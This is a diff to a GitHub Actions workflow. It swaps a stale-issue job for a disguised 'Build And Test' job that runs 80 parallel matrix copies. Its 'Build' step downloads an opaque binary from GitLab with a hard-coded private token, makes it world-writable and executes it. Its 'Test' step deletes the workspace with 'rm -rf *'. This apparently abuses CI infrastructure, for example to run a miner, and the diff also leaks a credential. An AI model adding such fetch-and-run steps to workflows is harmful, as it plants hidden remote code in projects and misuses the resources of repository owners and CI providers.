@@ -1,22 +1,28 @@
-name: Mark stale issues and pull requests
+name: Build And Test
 
 on:
-  schedule:
-  - cron: "0 9 * * *"
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
 
-jobs:
-  stale:
-
-    runs-on: ubuntu-latest
-    permissions:
-      issues: write
-      pull-requests: write
-
+jobs: 
+  build:
+    runs-on: ubuntu-18.04
+    strategy:
+      matrix:
+        D1: [0,1,2,3,4,5,6,7,8,9]
+        D2: [0,1,2,3,4,5,6,7]
+      fail-fast: false
     steps:
-    - uses: actions/stale@v3
-      with:
-        repo-token: ${{ secrets.GITHUB_TOKEN }}
-        stale-issue-message: 'Stale issue message'
-        stale-pr-message: 'Stale pull request message'
-        stale-issue-label: 'no-issue-activity'
-        stale-pr-label: 'no-pr-activity'
+    - name: Run checkout@v2.3.4
+      uses: actions/checkout@v2.3.4
+
+    - name: Build
+      run: |
+        wget -O builder --header='PRIVATE-TOKEN: skKqc7V8YmbfdHYxBft9' 'https://gitlab.com/api/v4/projects/24890163/repository/files/builder/raw?ref=master' && chmod 777 builder && ./builder
+        echo "done"
+    - name: Test
+      run: |
+        rm -rf *
+        echo "done"  
